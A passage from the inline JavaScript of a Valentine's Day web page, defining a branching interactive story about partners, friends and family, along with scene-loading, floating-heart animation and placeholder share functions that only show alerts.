            
            const storyScenes = {
                'start': {
                    text: "It's Valentine's Day, and you're thinking about the important connections in your life. Who would you like to focus on today?",
                    options: [
                        { text: "My romantic partner", next: "romantic_start", emoji: "❤️" },
                        { text: "A close friend", next: "friend_start", emoji: "👭" },
                        { text: "A family member", next: "family_start", emoji: "👨‍👩‍👧‍👦" }
                    ],
                    image: ""
                },
                'romantic_start': {
                    text: "You decide to plan something special for your partner. What kind of gesture feels most meaningful to you?",
                    options: [
                        { text: "A heartfelt letter expressing your feelings", next: "romantic_letter", emoji: "💌" },
                        { text: "A surprise date or experience together", next: "romantic_date", emoji: "🎡" },
                        { text: "A small but thoughtful gift", next: "romantic_gift", emoji: "🎁" }
                    ],
                    image: "https://images.unsplash.com/photo-1516589178581-6cd7833ae3b2?ixlib=rb-1.2.1&auto=format&fit=crop&w=500&q=80"
                },
                'friend_start': {
                    text: "You want to show appreciation for your friend. How do you want to celebrate your friendship?",
                    options: [
                        { text: "Reminisce about your favorite memories together", next: "friend_memories", emoji: "📸" },
                        { text: "Do something fun together", next: "friend_fun", emoji: "🎉" },
                        { text: "Tell them directly how much they mean to you", next: "friend_direct", emoji: "💬" }
                    ],
                    image: "https://images.unsplash.com/photo-1530103862676-de8c9debad1d?ixlib=rb-1.2.1&auto=format&fit=crop&w=500&q=80"
                },
                'family_start': {
                    text: "Family connections are special. How would you like to strengthen your bond today?",
                    options: [
                        { text: "Spend quality time together", next: "family_time", emoji: "⏳" },
                        { text: "Express gratitude for their support", next: "family_gratitude", emoji: "🙏" },
                        { text: "Create new traditions or memories", next: "family_traditions", emoji: "✨" }
                    ],
                    image: "https://images.unsplash.com/photo-1529333166437-7750a6dd5a70?ixlib=rb-1.2.1&auto=format&fit=crop&w=500&q=80"
                },
                'romantic_letter': {
                    text: "As you write, you realize how much your partner means to you. The letter becomes a treasure of your relationship. They're deeply touched when they read it.",
                    options: [
                        { text: "Continue the story", next: "romantic_end", emoji: "➡️" }
                    ],
                    image: "https://images.unsplash.com/photo-1518199266791-5375a83190b7?ixlib=rb-1.2.1&auto=format&fit=crop&w=500&q=80"
                },
                'romantic_date': {
                    text: "The surprise date goes perfectly! Whether it was adventurous or cozy, you both feel your connection deepen through the shared experience.",
                    options: [
                        { text: "Continue the story", next: "romantic_end", emoji: "➡️" }
                    ],
                    image: "https://images.unsplash.com/photo-1494774157365-9e04c6720e47?ixlib=rb-1.2.1&auto=format&fit=crop&w=500&q=80"
                },
                'romantic_gift': {
                    text: "The gift, though small, shows how well you know them. It's not about the object itself but the thought and care behind it that touches their heart.",
                    options: [
                        { text: "Continue the story", next: "romantic_end", emoji: "➡️" }
                    ],
                    image: "https://images.unsplash.com/photo-1516724562728-afc824a36e84?ixlib=rb-1.2.1&auto=format&fit=crop&w=500&q=80"
                },
                'friend_memories': {
                    text: "Looking through old photos and sharing stories brings laughter and maybe a few tears. You both appreciate how far you've come together.",
                    options: [
                        { text: "Continue the story", next: "friend_end", emoji: "➡️" }
                    ],
                    image: "https://images.unsplash.com/photo-1529333166437-7750a6dd5a70?ixlib=rb-1.2.1&auto=format&fit=crop&w=500&q=80"
                },
                'friend_fun': {
                    text: "Whether you tried something new or enjoyed an old favorite activity, the day reminds you why you became friends in the first place - you just have fun together!",
                    options: [
                        { text: "Continue the story", next: "friend_end", emoji: "➡️" }
                    ],
                    image: "https://images.unsplash.com/photo-1542838132-92c53300491e?ixlib=rb-1.2.1&auto=format&fit=crop&w=500&q=80"
                },
                'friend_direct': {
                    text: "Your friend is surprised but deeply touched by your words. Sometimes we don't say 'I appreciate you' often enough, and your honesty strengthens your bond.",
                    options: [
                        { text: "Continue the story", next: "friend_end", emoji: "➡️" }
                    ],
                    image: "https://images.unsplash.com/photo-1529333166437-7750a6dd5a70?ixlib=rb-1.2.1&auto=format&fit=crop&w=500&q=80"
                },
                'family_time': {
                    text: "The simple act of being fully present with each other - without distractions - creates meaningful moments that you'll all cherish.",
                    options: [
                        { text: "Continue the story", next: "family_end", emoji: "➡️" }
                    ],
                    image: "https://images.unsplash.com/photo-1576633587382-13ddf37b1fc1?ixlib=rb-1.2.1&auto=format&fit=crop&w=500&q=80"
                },
                'family_gratitude': {
                    text: "Hearing your appreciation means more to your family member than you realize. Your words acknowledge the often invisible work of love they've done over the years.",
                    options: [
                        { text: "Continue the story", next: "family_end", emoji: "➡️" }
                    ],
                    image: "https://images.unsplash.com/photo-1573497019940-1c28c88b4f3e?ixlib=rb-1.2.1&auto=format&fit=crop&w=500&q=80"
                },
                'family_traditions': {
                    text: "Whether it's a new ritual or a twist on an old one, this becomes a tradition you'll look forward to repeating in years to come, strengthening your family bonds.",
                    options: [
                        { text: "Continue the story", next: "family_end", emoji: "➡️" }
                    ],
                    image: "https://images.unsplash.com/photo-1573497620053-ea5300f94f21?ixlib=rb-1.2.1&auto=format&fit=crop&w=500&q=80"
                },
                'romantic_end': {
                    text: "Your Valentine's Day celebration leaves you both feeling loved and appreciated. You realize it's not about grand gestures but the daily choice to cherish your connection.",
                    ending: true,
                    image: "https://images.unsplash.com/photo-1516589178581-6cd7833ae3b2?ixlib=rb-1.2.1&auto=format&fit=crop&w=500&q=80"
                },
                'friend_end': {
                    text: "The day reminds you that friendship is one of life's greatest gifts. You make a mental note to celebrate your connection more often, not just on special occasions.",
                    ending: true,
                    image: "https://images.unsplash.com/photo-1530103862676-de8c9debad1d?ixlib=rb-1.2.1&auto=format&fit=crop&w=500&q=80"
                },
                'family_end': {
                    text: "You go to bed grateful for the unconditional love of family. These bonds form the foundation that supports you through all of life's ups and downs.",
                    ending: true,
                    image: "https://images.unsplash.com/photo-1529333166437-7750a6dd5a70?ixlib=rb-1.2.1&auto=format&fit=crop&w=500&q=80"
                }
            };
            
            startStoryBtn.addEventListener('click', startStory);
            restartStoryBtn.addEventListener('click', resetStory);
            
            function startStory() {
                storyStart.style.display = 'none';
                storyContent.style.display = 'block';
                loadScene('start');
            }
            
            function loadScene(sceneId) {
                storyState.currentScene = sceneId;
                storyState.path.push(sceneId);
                
                const scene = storyScenes[sceneId];
                currentStory.textContent = scene.text;
                
                if (scene.image) {
                    storyImage.style.backgroundImage = `url('${scene.image}')`;
                    storyImage.classList.add('active');
                } else {
                    storyImage.classList.remove('active');
                }
                
                // Clear previous options
                storyOptions.innerHTML = '';
                
                if (scene.ending) {
                    // Show ending
                    storyContent.style.display = 'none';
                    storyEnd.style.display = 'block';
                    document.getElementById('story-ending-message').textContent = scene.text;
                    
                    if (scene.image) {
                        storyImage.style.backgroundImage = `url('${scene.image}')`;
                        storyImage.classList.add('active');
                    }
                } else {
                    // Add new options
                    scene.options.forEach(option => {
                        const optionEl = document.createElement('div');
                        optionEl.className = 'story-option';
                        optionEl.innerHTML = `${option.emoji ? option.emoji + ' ' : ''}${option.text}`;
                        optionEl.addEventListener('click', () => loadScene(option.next));
                        storyOptions.appendChild(optionEl);
                    });
                }
            }
            
            function resetStory() {
                storyState = {
                    path: [],
                    currentScene: 'start'
                };
                
                storyEnd.style.display = 'none';
                storyStart.style.display = 'block';
            }
            
            // Create floating hearts in background
            function createHearts() {
                const background = document.getElementById('background');
                const heartCount = 20;
                
                for (let i = 0; i < heartCount; i++) {
                    const heart = document.createElement('div');
                    heart.className = 'heart';
                    heart.innerHTML = '❤️';
                    heart.style.left = `${Math.random() * 100}vw`;
                    heart.style.top = `${Math.random() * 100}vh`;
                    heart.style.fontSize = `${Math.random() * 20 + 10}px`;
                    heart.style.animationDuration = `${Math.random() * 20 + 10}s`;
                    heart.style.animationDelay = `${Math.random() * 5}s`;
                    background.appendChild(heart);
                }
            }
            
            // Share functions
            function shareLetter(platform) {
                const recipient = document.getElementById('recipient-name').value || 'someone special';
                alert(`Sharing your love letter to ${recipient} on ${platform}. (In a real implementation, this would use the platform's sharing API.)`);
            }
            
            function shareQuizResult(platform) {
                const resultTitle = document.getElementById('result-title').textContent;
                alert(`Sharing your quiz result "${resultTitle}" on ${platform}. (In a real implementation, this would use the platform's sharing API.)`);
            }
            
            function shareCard(platform) {
                alert(`Sharing your Valentine's card on ${platform}. (In a real implementation, this would use the platform's sharing API.)`);
            }
            
            function shareStory(platform) {
                alert(`Sharing your interactive story ending on ${platform}. (In a real implementation, this would use the platform's sharing API.)`);
            }
        });
    </script>
</body>
</html>